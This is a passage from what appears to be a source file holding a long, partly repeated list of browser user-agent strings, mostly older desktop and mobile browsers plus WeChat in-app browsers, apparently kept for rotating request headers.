	 "Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5', 'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20', 'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a', 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2', 'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
     'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2', 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0', 'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
     'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
     'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
     'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
     'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
     'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
     'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
     'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
     'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
     'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
     'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
     'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
     'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
     'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
     'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
     'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
     'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0', 'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN', 'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5', 'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20', 'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a', 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2', 'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
     'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2', 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0', 'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
     'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
     'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
     'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
